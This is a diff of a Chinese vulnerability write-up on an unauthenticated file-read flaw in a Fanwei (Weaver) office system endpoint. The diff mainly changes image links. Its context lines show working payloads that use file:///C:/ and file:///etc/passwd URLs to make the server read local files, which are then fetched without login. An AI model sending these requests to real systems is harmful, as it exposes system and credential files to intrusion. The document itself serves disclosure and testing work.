@@ -26,25 +26,25 @@
 
 访问 **http://xxx.xxx.xxx.xxx/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///C:/&fileExt=txt**
 
-![](image/fanwei-1.png)
+![](http://wikioss.peiqi.tech/vuln/fanwei-1.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
 
 成功返回 **id值**,说明含有此漏洞
 
 调用查看文件接口访问 **http://xxx.xxx.xxx.xxx/file/fileNoLogin/id值**
 
-![](image/fanwei-2.png)
+![](http://wikioss.peiqi.tech/vuln/fanwei-2.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
 
 ### Linux
 
 访问 **http://xxx.xxx.xxx.xxx/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///etc/passwd&fileExt=txt**
 
-![](image/fanwei-3.png)
+![](http://wikioss.peiqi.tech/vuln/fanwei-3.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
 
 成功返回 **id值**,说明含有此漏洞
 
 调用查看文件接口访问 **http://xxx.xxx.xxx.xxx/file/fileNoLogin/id值**
 
-![](image/fanwei-4.png)
+![](http://wikioss.peiqi.tech/vuln/fanwei-4.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
 
 ## 漏洞利用POC
 
@@ -184,4 +184,4 @@ if __name__ == '__main__':
 
 ```
 
-![](image/fanwei-5.png)
+![](http://wikioss.peiqi.tech/vuln/fanwei-5.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
